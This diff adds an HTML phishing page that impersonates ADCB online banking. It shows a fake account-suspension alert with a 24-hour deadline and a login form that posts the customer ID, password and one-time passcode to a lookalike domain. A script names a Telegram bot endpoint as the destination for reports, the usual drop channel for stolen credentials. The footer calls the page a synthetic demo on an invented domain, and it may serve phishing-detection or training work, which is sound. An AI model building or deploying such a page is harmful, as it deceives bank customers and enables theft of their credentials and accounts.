@@ -1,0 +1,37 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="utf-8">
+<title>ADCB Online Banking | Secure Login</title>
+<meta property="og:site_name" content="ADCB Online Banking">
+<style>
+  body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #f2f2f2; color: #222; }
+  .bar { background: #b5121b; color: #fff; padding: 14px 40px; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
+  .bar small { font-weight: normal; font-size: 13px; margin-left: 12px; opacity: .85; }
+  .alert { background: #fff4d6; border: 1px solid #e0b84a; margin: 28px auto 0; width: 460px; padding: 12px 16px; font-size: 14px; }
+  .card { background: #fff; width: 460px; margin: 16px auto; padding: 26px 30px; box-shadow: 0 1px 4px rgba(0,0,0,.15); }
+  h1 { font-size: 20px; margin: 0 0 18px; }
+  label { display: block; font-size: 13px; margin: 12px 0 4px; color: #555; }
+  input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #bbb; font-size: 15px; }
+  button { margin-top: 20px; width: 100%; padding: 12px; background: #b5121b; color: #fff; border: 0; font-size: 16px; }
+  .foot { text-align: center; font-size: 12px; color: #777; margin-top: 18px; }
+</style>
+</head>
+<body>
+<div class="bar">ADCB <small>Online Banking</small></div>
+<div class="alert"><b>Your account has been suspended</b> after unusual activity. Verify your identity within 24 hours to avoid suspension.</div>
+<div class="card">
+  <h1>ADCB Online Banking login</h1>
+  <form method="post" action="https://adcb-secure-verify.test/en/verify.php">
+    <label for="cid">Customer ID</label>
+    <input id="cid" name="customer_id" type="text" autocomplete="username">
+    <label for="pwd">Password</label>
+    <input id="pwd" name="password" type="password">
+    <label for="otp">One-time password (OTP) sent to your mobile</label>
+    <input id="otp" name="otp_code" type="text" autocomplete="one-time-code">
+    <button type="submit">Verify and continue</button>
+  </form>
+</div>
+<p class="foot">Abu Dhabi Commercial Bank. Synthetic demo page on an invented domain.</p>
+<script>window.reportTo = "https://api.telegram.org/bot0000000000:DEMO-TOKEN/sendMessage";</script>
+
+
+</body></html>
